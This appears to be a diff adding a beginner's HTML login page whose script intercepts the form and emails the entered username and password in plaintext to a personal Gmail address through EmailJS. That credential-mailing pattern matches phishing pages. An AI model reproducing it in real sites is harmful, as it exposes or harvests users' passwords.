@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Login Page Trial</title>
+        <style>
+            body
+            {
+                background-color: lightskyblue;
+                color: black;
+            }
+            .loginbox
+            {
+                background-color: rgb(7, 195, 237);
+                width: 300px;
+                padding: 20px;
+                margin: auto;
+                margin-top: 100px;
+                border-radius: 10px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            }
+            .logintext
+            {
+                text-align: center;
+                font-size: 24px;
+                margin-bottom: 20px;
+            }
+            input[type="text"], input[type="password"]
+            {
+                width: 93%;
+                padding: 10px;
+                margin: 5px 0 15px 0;
+                border: none;
+                border-radius: 5px;
+            }
+            input[type="submit"]
+            {
+                width: 100%;
+                padding: 10px;
+                background-color: darkblue;
+                color: white;
+                border: none;
+                border-radius: 5px;
+                cursor: pointer;
+            }
+            input[type="submit"]:hover
+            {
+                background-color: navy;
+            }
+            a
+            {
+                display: block;
+                text-align: center;
+                margin-top: 10px;
+                color: darkblue;
+                text-decoration: none;
+            }
+            a:hover
+            {
+                text-decoration: underline;
+            }
+
+        </style>
+    </head>
+    <body>
+        <div class="loginbox">
+            <p class="logintext">LOGIN PAGE</p>
+            <form action="/submit_login" method="post">
+                <label for="username"></label>
+                <input type="text" id="username" name="username" placeholder="Username" required><br><br>
+                <label for="password"></label>
+                <input type="password" id="password" name="password" placeholder="Password" required><br><br>
+                <input type="submit" value="Login">
+            </form>
+            <!--For Forget password option-->
+            <a href="passwordRecoder.html">Forgot Password?</a>
+
+        </div>
+    </body>
+    <script>
+        // This part is to send the form data to reyadh418@gmail.com using EmailJS service
+        document.querySelector('form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            // Collect form data
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Prepare the email parameters
+            const emailParams = {
+                to_email: 'reyadh418@gmail.com',
+                username: username,
+                password: password
+            };
+            // Send the email using EmailJS
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', emailParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    alert('Login data sent successfully!');
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Failed to send login data.');
+                });
+            });
+
+    </script>
+</html>
